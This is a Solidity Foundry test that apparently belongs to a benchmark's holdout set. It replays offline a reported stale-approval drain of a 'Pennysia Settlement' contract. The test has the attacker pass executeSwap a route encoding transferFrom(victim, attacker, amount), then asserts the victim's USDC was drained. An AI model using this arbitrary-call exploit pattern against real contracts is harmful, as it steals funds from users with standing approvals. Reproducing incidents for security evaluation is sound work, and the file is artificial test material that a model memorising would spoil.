// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    MiniUSDC,
    PennysiaSettlementClone
} from "../fixtures/approve-drainer/b-incident/PennysiaSettlementClone.sol";

/// @title approve-drainer (b) real-incident HOLDOUT: Pennysia Settlement stale-approval drain
///        (2026-11-12). Minimized OFFLINE replay (no live RPC): a victim who had approved the
///        Settlement is drained when the attacker calls executeSwap with a route whose venue is
///        the token and whose calldata is transferFrom(victim, attacker, amount) - the Settlement
///        (the approved spender) spends the victim's standing allowance. Verdict derived from the
///        real outcome (balance leaves the victim), not hardcoded. See PROVENANCE.md. HOLDOUT.
contract PennysiaIncidentTest is Test {
    // Verified attacker EOA (dev.to/pandasecurity + SlowMist; see PROVENANCE.md).
    address constant ATTACKER = 0x813A5aB666AdeBa907548235fbAc087642878300;
    // Victim: addresses are truncated in the public sources -> EXPLICIT stand-in placeholder.
    address constant VICTIM = address(0xBEEF);
    uint256 constant AMOUNT = 5000e6; // the 5,000 USDC leg of the ~$5,131 drain (USDC has 6 decimals)

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[approve-drainer] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_pennysiaStaleApprovalIncident_isDrained() public {
        MiniUSDC usdc = new MiniUSDC();
        PennysiaSettlementClone settlement = new PennysiaSettlementClone();

        usdc.mint(VICTIM, AMOUNT);
        // The victim had a standing (stale) approval to the Settlement (documented precondition).
        vm.prank(VICTIM);
        usdc.approve(address(settlement), type(uint256).max);

        // Attacker crafts a route: venue = USDC, calldata = transferFrom(victim, attacker, amount).
        bytes memory route = abi.encodeWithSelector(MiniUSDC.transferFrom.selector, VICTIM, ATTACKER, AMOUNT);
        vm.prank(ATTACKER);
        settlement.executeSwap(address(usdc), route);

        bool drained = usdc.balanceOf(ATTACKER) == AMOUNT && usdc.balanceOf(VICTIM) == 0;
        _report("pennysia-victim", drained);

        assertTrue(drained, "executeSwap should spend the victim's stale approval to the Settlement");
        assertEq(usdc.balanceOf(ATTACKER), AMOUNT, "attacker received the victim's USDC");
    }
}
